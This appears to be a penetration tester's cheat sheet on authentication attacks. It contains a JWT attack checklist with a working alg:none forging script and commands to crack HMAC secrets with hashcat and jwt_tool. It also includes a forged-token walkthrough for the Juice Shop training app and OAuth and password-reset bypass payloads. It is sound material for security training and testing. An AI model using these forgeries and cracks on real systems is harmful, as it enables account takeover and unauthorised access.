# Auth & JWT

## JWT structure

`header.payload.signature` — each base64url. Decode with `jwt.py` or:
```bash
echo "<token>" | cut -d. -f1,2 | tr '.' '\n' | while read p; do echo "$p" | base64 -d 2>/dev/null; echo; done
```

## Attack checklist

| # | Attack | How |
|---|---|---|
| 1 | `alg: none` | Change header to `{"alg":"none","typ":"JWT"}`, drop signature, keep trailing `.` |
| 2 | HS/RS confusion | Server verifies RS256 token; you resign with HS256 using the PUBLIC key as HMAC secret |
| 3 | Weak HMAC secret | Dump token, run `hashcat -m 16500 token.jwt wordlist` |
| 4 | `kid` SQLi / path traversal | `"kid": "../../../../dev/null"` → signs with empty key |
| 5 | `jku` / `x5u` | Point to attacker-hosted JWKS, sign with matching key |
| 6 | Trust-boundary bugs | Change `role`/`admin` claim, see if server rechecks DB |
| 7 | Expiry replay | Reuse old token after logout, check if `jti` revocation exists |

### `alg: none` concrete

```python
import base64, json
h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode()).rstrip(b'=').decode()
print(f"{h}.{p}.")
```

### HS256 crack

Prefer `jwt_tool` on the Kali VM (`/opt/tools/jwt_tool`):
```bash
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

Or hashcat:
```bash
# token.jwt is the full token on one line
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

### Juice Shop forged token flow

1. Login as any user → grab JWT from `Authorization: Bearer`.
2. Decode payload: `{"status":"success","data":{"id":21,"email":"you@you","role":"customer",...},"iat":...,"exp":...}`.
3. Change `email` to `jwtn3d@juice-sh.op` (challenge-specific) and set `alg:none` with empty signature. Juice Shop accepts both none and RS256 with the embedded public key.

## Session cookies

| Signal | Attack |
|---|---|
| Decodable base64 payload | Flask `s:...` cookie — use `flask-unsign` to crack SECRET_KEY |
| JSON cookie | Tamper directly, check for signature |
| Predictable session ID | Sequential IDs, timestamps, incrementing |
| Same cookie across accounts | Session fixation |

## OAuth

- Redirect-URI loose match: `evil.com.target.com`, `target.com@evil.com`.
- `state` missing → CSRF-login.
- `code` reusable → race windows.
- Implicit flow leaks token in URL fragment (now Referer / history).

## Password reset

- Token in URL — check predictability, length, entropy. 
- Email-based reset — try changing `Host:` header, see if link in email reflects attacker domain (host-header injection).
- Response leak — look for `response.data.token` on reset request.
